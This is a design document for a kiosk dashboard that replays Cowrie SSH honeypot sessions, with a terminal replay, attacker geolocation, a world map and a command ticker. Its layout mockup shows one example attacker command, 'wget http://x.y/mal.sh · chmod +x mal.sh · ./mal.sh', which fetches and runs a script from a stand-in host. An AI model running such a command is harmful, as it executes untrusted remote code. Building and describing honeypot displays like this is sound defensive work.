# Attack Theater — Design

**Status:** draft
**Date:** 2026-04-10
**Working name:** `attack_theater`

## Summary

A web-based display that replays Cowrie honeypot SSH sessions on a wall monitor
in a public/demo setting. Shows live attacks the moment they happen and
auto-cycles through a curated archive of past sessions the rest of the time.
The display is a rich dashboard: a central terminal replay, an attacker
metadata sidebar, a world map of recent attack origins, top-countries list, and
a scrolling command ticker.

## Goals

- Replay Cowrie SSH session recordings in a browser at near-authentic speed.
- Cut immediately to any new live session as it happens; resume archive
  playback when the live session ends.
- Run as a kiosk display — zero interaction, fullscreen, boot-and-forget.
- Fit cleanly into the existing Docker-compose stack on the gateway host and
  reuse existing data sources (Cowrie JSON logs and TTY recordings).

## Non-goals

- Manual session curation UI (v1 is fully automatic).
- User authentication or multi-tenant access control (intended for LAN /
  loopback access only).
- Historical search, filtering, analytics UI for operators (the
  `session_analyzer` service covers that need separately).
- Rendering anything other than Cowrie SSH/telnet TTY recordings.

## User experience

- **Audience:** non-technical viewers in an office lobby / conference booth.
- **Viewing distance:** across a room; the terminal font and dashboard
  elements must read from several meters away.
- **Interaction model:** none. The browser runs in kiosk mode; viewers watch.

### Screen layout

```
┌──────────────────────────────────────────────────────────────┐
│  PROJECT VIOLET  ·  attack theater     10:47:22  12,430 today │
├──────────────┬──────────────────────────────┬────────────────┤
│              │                              │                │
│  ATTACKER    │                              │   WORLD MAP    │
│              │                              │   (recent      │
│  203.0.113.5 │        [xterm.js]            │    pins)       │
│  🇷🇺 Russia  │                              │                │
│  AS12345     │                              ├────────────────┤
│              │                              │   TOP 5 TODAY  │
│  hop1        │                              │   🇷🇺 4,201    │
│  02:14       │                              │   🇨🇳 2,988    │
│  ⚡ LIVE     │                              │   ...          │
│              │                              │                │
├──────────────┴──────────────────────────────┴────────────────┤
│  ← wget http://x.y/mal.sh  ·  chmod +x mal.sh  ·  ./mal.sh   │
└──────────────────────────────────────────────────────────────┘
```

CSS Grid: header (60px) / body (1fr) / footer (40px); body columns
260px / 1fr / 260px.

### Dashboard elements

- **Header:** project name left, live clock and "Attacks today: N" counter
  right. Clock is driven by browser-local time.
- **Left sidebar:** current session metadata — src_ip, reverse DNS (best
  effort), country flag emoji, country name, ASN/ISP, hop tag, session
  duration counter, LIVE (pulsing red) or REPLAY (muted amber) badge.
- **Center:** xterm.js terminal, large monospace font, dark background.
- **Right sidebar top:** SVG world map (simple country outlines) with animated
  dots for the last ~50 attacks; dots fade over time.
- **Right sidebar bottom:** top-5 source countries today with counts and flags.
- **Footer ticker:** horizontal CSS-animated marquee of the current session's
  recent commands.

### Playback behavior

- **Archive cycling:** when no session is live, randomly pick an "interesting"
  session from the catalog, avoiding the last 5 played, and replay it.
- **Live interrupt:** when a honeypot session reaches `cowrie.login.success`,
  cut immediately to that session. A brief "⚡ LIVE ATTACK" flash precedes
  the cut.
- **Idle title card:** if the catalog has no interesting sessions yet and no
  live activity is happening, display a static "PROJECT VIOLET — WAITING FOR
  ATTACKERS" card.
- **Dead-air compression:** any inter-frame gap in the TTY recording longer
  than 2000ms is compressed to 500ms. Frames are otherwise replayed at
  original timing. This rule applies to both archive and live playback.
- **Auto-curation:** a session qualifies as "interesting" when it closes if
  **all** of: login_success occurred, command_count >= 3, duration >= 20s.

## Architecture

### Deployment

- Runs as a new Docker container (`attack_theater`) in
  `docker-compose.internet-honeypot.yml`.
- Mounts the same cowrie log volumes as `session_analyzer`, read-only:
  `cowrie_hop1/log/cowrie`, `cowrie_hop1/lib/cowrie/tty`, and the same for
  hop2 and hop3.
- Mounts the MaxMind GeoLite2-City.mmdb database as a file.
- Exposes port 8080 on the gateway host (LAN-only by default; no public
  exposure).
- Runs as non-root with the same GID as the cowrie log files.

### Top-level data flow

```
cowrie.json (hop1/2/3)  →  log_watcher  →  asyncio events
                                              ↓
tty/<hash> files        →  tty_reader  ←  director  →  WebSocket  →  browser
                                              ↓
                                           catalog (SQLite)
```

### Components

One Python process, five modules, single asyncio event loop.

#### 1. `log_watcher.py`

Uses `watchdog` (already a project dependency) to tail the three `cowrie.json`
files. Handles log rotation by watching the containing directory for new file
creation and re-opening, following the pattern used in `session_analyzer`.

Emits events onto an internal asyncio queue:

- `session_started(session_id, hop, src_ip, tty_file_path, start_time)` —
  from `cowrie.session.connect`.
- `session_login_success(session_id)` — from `cowrie.login.success`.
- `session_command(session_id, command)` — from `cowrie.command.input`.
- `session_ended(session_id, end_time, command_count, duration)` — from
  `cowrie.session.closed`.

The TTY file path is resolved by mapping `session_id` to the `tty/<hash>`
filename written by Cowrie. This mapping is available via `cowrie.log.closed`
events or by scanning the tty directory for the matching file.

#### 2. `catalog.py`

In-memory session index with a SQLite file (`theater.db`) for persistence
across restarts. A session record holds:

| field            | type     | source                              |
|------------------|----------|-------------------------------------|
| `session_id`     | text PK  | cowrie JSON                         |
| `hop`            | int      | directory mapping                   |
| `src_ip`         | text     | cowrie JSON                         |
| `country`        | text     | MaxMind lookup                      |
| `country_code`   | text     | MaxMind lookup                      |
| `asn_org`        | text     | MaxMind lookup                      |
| `lat`, `lon`     | real     | MaxMind lookup                      |
| `start_time`     | real     | cowrie JSON                         |
| `end_time`       | real     | cowrie JSON                         |
| `command_count`  | int      | cowrie JSON aggregation             |
| `duration`       | real     | computed                            |
| `tty_file_path`  | text     | tty directory                       |
| `is_interesting` | bool     | auto-curation rule                  |

Key methods:

- `record_start(session_started_event)` — resolves geo, inserts row.
- `append_command(session_id)` — increments `command_count`.
- `finalize(session_ended_event)` — writes end_time/duration and calls
  `mark_if_interesting`.
- `mark_if_interesting(session_id)` — applies the curation rule.
- `pick_next_archive(exclude_ids)` — random pick from `is_interesting=true`.
- `recent_pins(n)` — last N sessions with lat/lon for the map.
- `top_countries_today()` — group-by for the top-5 list.
- `attacks_today_count()` — simple count for the header.

#### 3. `tty_reader.py`

Parses the Cowrie TTY binary format. Header (verified from
`cowrie.scripts.playlog` source): `struct "<iLiiLL"` = `(op, tty, length,
direction, sec, usec)`, followed by `length` bytes of data.

Constants: `OP_OPEN=1, OP_CLOSE=2, OP_WRITE=3, OP_EXEC=4`;
`TYPE_INPUT=1, TYPE_OUTPUT=2, TYPE_INTERACT=3`.

Only replays `OP_WRITE` records, matching `playlog`'s filter: records whose
direction equals the inferred "output" direction (the first non-interact
direction seen in the file) **or** whose direction is `TYPE_INTERACT` (exec
commands, which playlog always shows). All other records — pure input
records in an interactive session — are dropped, so viewers see only what
the fake shell printed.

Two modes:

- **`read_finite(path)`** — reads the file to EOF and yields
  `(delay_ms: int, data: bytes)` tuples. `delay_ms` is `usec` gap from
  previous frame, clamped by the dead-air compression rule (if gap > 2000,
  set to 500).
- **`tail(path, stop_event)`** — reads existing bytes then follows the file
  for new ones. Yields the same tuples. Terminates when `stop_event` is set
  (director sets this on `session_ended` or on 10-minute stale-live timeout).

Graceful on truncation: `struct.error` / short reads → clean stop. Corrupt
files go into a per-process "poisoned" set and are never retried during the
same process lifetime.

#### 4. `director.py`

Single asyncio task running a state machine:

```
state = IDLE | LIVE(session_id) | ARCHIVE(session_id)
```

Transitions:

- `IDLE → ARCHIVE(pick)`  — whenever catalog becomes non-empty and no live.
- `ARCHIVE → ARCHIVE(pick)` — when current archive playback finishes.
- `ARCHIVE → LIVE(id)`  — on `session_login_success` for a new session; the
  archive's tty_reader is cancelled mid-stream.
- `IDLE → LIVE(id)`  — on `session_login_success` while idle.
- `LIVE → ARCHIVE(pick)`  — on `session_ended` for the live session, after
  calling `catalog.finalize` and `mark_if_interesting`.
- `LIVE → ARCHIVE(pick)`  — on 10-minute stale-live timeout; the live
  session's tty tail continues in the background but does not preempt again.
- `ARCHIVE → IDLE` — if `pick_next_archive` returns nothing.

`pick_next_archive` excludes the last 5 played session IDs to avoid
repetition.

Director publishes events onto a broadcast channel (asyncio Queue per
connected client) that the WebSocket handler forwards to browsers.

#### 5. `web.py`

FastAPI app.

- `GET /` — serves `static/index.html`.
- `GET /static/*` — xterm.js bundle, SVG world map, CSS, `app.js`, MaxMind-
  derived country centroids JSON.
- `WS /stream` — single WebSocket endpoint. Messages (JSON):

| type            | fields                                                     |
|-----------------|------------------------------------------------------------|
| `session_start` | `mode` ("live"|"replay"), `session` (metadata object)      |
| `frame`         | `delay_ms`, `data` (base64-encoded bytes)                  |
| `command`       | `command` (string) — for the ticker                        |
| `session_end`   | —                                                          |
| `stats`         | `attacks_today`, `top_countries`, `recent_pins`            |
| `title_card`    | — (IDLE state; client shows the waiting screen)            |

The server pushes `stats` every 5 seconds.

On client connect, the server immediately sends the current state:
`session_start` + an initial `stats` frame. Replay restarts from the
beginning on reconnect (no per-client cursor tracking).

### Frontend

One static HTML page + `app.js` + `style.css` + vendored libraries. No
framework.

Libraries (all vendored, served from `/static`, fully offline):

- **xterm.js** — terminal renderer.
- **SVG world map** — simple country outlines, CSS-positioned pin dots. No
  Leaflet, no tile server, no network dependency beyond the WebSocket.
- **Flag rendering** — Unicode regional-indicator sequences from the system
  font.

`app.js` responsibilities:

1. Connect to `/stream`; reconnect with exponential backoff
   (1s → 2s → 5s → 10s cap) on close.
2. Handle messages:
   - `session_start` → reset xterm, update sidebar, set badge, start session
     clock.
   - `frame` → chain `setTimeout(() => term.write(atob(data)), delay_ms)` so
     frames play sequentially with their delays.
   - `command` → prepend to the ticker and restart the scroll animation.
   - `session_end` → fade the sidebar badge.
   - `stats` → update the today counter, refresh map pins, redraw top-5.
   - `title_card` → hide the dashboard, show the waiting card.
3. Drive the header clock from local time.
4. Nothing else. No routing, no local state beyond the current session.

### Geolocation

MaxMind GeoLite2-City is read via the `maxminddb` Python package at session
start. Resolution is best-effort: private IPs, loopback, or unmatched ranges
produce `country="Unknown"`, no flag, and the map pin is skipped. Geo lookup
never blocks session ingest.

The GeoLite2-City.mmdb file is downloaded by the operator and mounted into
the container; the repo does not bundle it.

### Kiosk mode

The monitor machine runs Chromium in kiosk mode, e.g.:

```bash
chromium --kiosk --noerrdialogs --disable-infobars \
         --incognito --no-first-run \
         http://<gateway-host>:8080/
```

Autostart is configured via the display machine's OS (systemd user service or
desktop autostart). Kiosk setup is documented but is not packaged by this
project.

## Error handling

- **Bad/truncated TTY files:** `tty_reader` catches `struct.error` and EOF,
  yields what it has and stops cleanly. Director moves on. Corrupt files are
  added to a "poisoned" set and skipped for the remainder of the process.
- **Missing TTY for a live session:** director waits up to 2s for the file
  to appear; if still missing, falls back to ARCHIVE.
- **WebSocket disconnect:** client reconnects with backoff; on reconnect the
  server sends the current session from the beginning.
- **Geolocation failure:** session proceeds; sidebar shows "Unknown" and the
  map pin is omitted.
- **Empty catalog on first boot:** director stays in IDLE and the frontend
  shows the title card until the first qualifying session closes.
- **Log rotation:** `log_watcher` re-opens rotated files using the
  session_analyzer pattern (inode-swap detection via watchdog).
- **Simultaneous live sessions:** director takes the first to reach
  login_success; others are captured into the catalog normally and get
  replayed later. No on-screen indication in v1.
- **Indefinite live sessions:** 10-minute cap as described in director state
  machine.

## Testing

### Unit (pytest)

- `tty_reader` — parse a known fixture file; verify frame count and byte
  totals; parse a truncated file; verify graceful EOF; apply dead-air
  compression to a synthetic frame sequence and verify large gaps are
  squashed to 500ms.
- `catalog.mark_if_interesting` — parametrized on threshold edges (2 vs 3
  commands, 19s vs 20s duration, login_success true/false).
- `director` state machine — feed a sequence of synthetic log events,
  assert the transitions: IDLE → ARCHIVE on catalog populated, ARCHIVE →
  LIVE on login_success, LIVE → ARCHIVE on session_ended, LIVE → ARCHIVE on
  stale-live timeout, ARCHIVE → IDLE on empty catalog.

### Integration

- Spin up the service against a fixture directory containing a canned
  `cowrie.json` plus matching TTY files. Connect a test WebSocket client.
  Assert the expected sequence of `session_start` → N×`frame` → `session_end`
  messages arrives in order and with non-decreasing timestamps.

### Manual smoke test

- Point the service at the real `logs/data/` directory on the gateway host.
  Open `http://localhost:8080/` in a browser. Watch one of the existing
  recorded sessions replay end-to-end and visually confirm that xterm
  renders it correctly, that dead-air compression kicks in as expected, and
  that the sidebar metadata is populated.

## Privacy / exposure notes

- The service binds to localhost or the LAN interface only; not intended
  for internet exposure. The existing gateway firewall configuration will
  enforce this; operator is responsible for not opening port 8080 outbound.
- Attacker IPs, geolocation, and any credentials typed at the fake shell
  are displayed as-is. Cowrie only records attacker-supplied credentials;
  no real user credentials exist in these logs to leak.
- No user-facing inputs means no XSS / injection surface in the dashboard.

## Out of scope for v1

- Manual curation / featured-session pinning.
- Admin UI for pruning or re-scoring sessions.
- Historical analytics (counts per day, command frequency, etc.) beyond the
  top-5 and today counters.
- Audio / sound effects.
- Multiple simultaneous client browsers with per-client state (server
  supports multiple clients but they all see the same stream).
- Internet exposure, authentication, or TLS termination.

## File layout

```
attack_theater/
├── Dockerfile
├── requirements.txt
├── pyproject.toml or setup.cfg
├── app/
│   ├── __init__.py
│   ├── main.py          # entry point, wires everything together
│   ├── log_watcher.py
│   ├── catalog.py
│   ├── tty_reader.py
│   ├── director.py
│   ├── web.py
│   └── geo.py           # MaxMind wrapper
├── static/
│   ├── index.html
│   ├── app.js
│   ├── style.css
│   ├── world.svg
│   ├── countries.json   # ISO codes → centroid lat/lon
│   └── vendor/
│       └── xterm/       # xterm.js bundle
└── tests/
    ├── fixtures/
    │   ├── sample.tty
    │   ├── truncated.tty
    │   └── cowrie.json
    ├── test_tty_reader.py
    ├── test_catalog.py
    ├── test_director.py
    └── test_integration.py
```

## Open questions

None at spec time. Any choices deferred to implementation (e.g., exact
asyncio queue sizes, SQLite pragmas, specific SVG map source) are
intentionally left to the implementation plan.
